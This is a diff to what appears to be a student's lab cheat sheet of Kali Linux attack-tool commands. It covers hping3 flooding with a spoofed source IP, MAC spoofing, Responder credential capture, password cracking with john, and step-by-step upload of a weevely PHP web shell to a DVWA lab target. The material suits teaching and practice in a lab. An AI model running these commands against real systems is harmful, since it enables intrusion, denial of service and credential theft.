@@ -18,7 +18,7 @@ exploit
 1(b). hping
 sudo apt install hping3
 sudo hping3 -S <ip_address> -p <port> -c <number_of_packets> 
-sudo hping3 --traceroute -V -1 <ip_address>
+sudo hping3 --traceroute -V -1 <ip_address> 
 sudo hping3 -a <FAKE IP> <target> -S -q -p 80 --faster     sudo hping3 -a 192.168.225.128 192.168.225.128 -S -q -p 80 --faster
 
 2(b) Httrack
@@ -33,11 +33,13 @@ john --single --format=raw-sha1 file.txt
 crunch <min> <max> word
 
 4(a) Macchanger
-macchanger -s eth0
+macchanger -s eth0     display n exit
 ifconfig eth0 down
-macchanger -r eth0
+macchanger -r eth0     random
 ifconfig eth0 down
-macchanger -s eth0
+macchanger -p eth0     changes to original
+macchanger -e eth0     ending bytes change 
+macchanger -m eth0     manually change MAC
 
 4(b) Responder
 responder -I eth0 
@@ -49,7 +51,7 @@ Run it with john to get the credentials
 weevely generate 12345 shell.php
 kali firefox-> enter metaspoilt ip
 click on dvwa, switch security to low and submit, "admin" and "password"
-go to upload n upload shell.php, copy the path from "hackable" and paste after dvwa/
+go to upload n upload shell.php, copy the path from "hackable" and paste after dvwa/     hackable/uploads/shell.php
 copy the entire url and enter this in the terminal: weevely "paste url here" 12345
 
 5(b) Proxychain
@@ -80,6 +82,8 @@ cutycapt --url=https://www.rvce.edu.in --out=outt.png
 
 8(a)Netdiscover
 sudo netdiscover -r "ip address"
+sudo netdiscover -m "ip address"  mac address
+sudo netdiscover -p "ip address"  passive mode
 
 8(b)pdf-parser
 pdf-parser -a "pdfname"
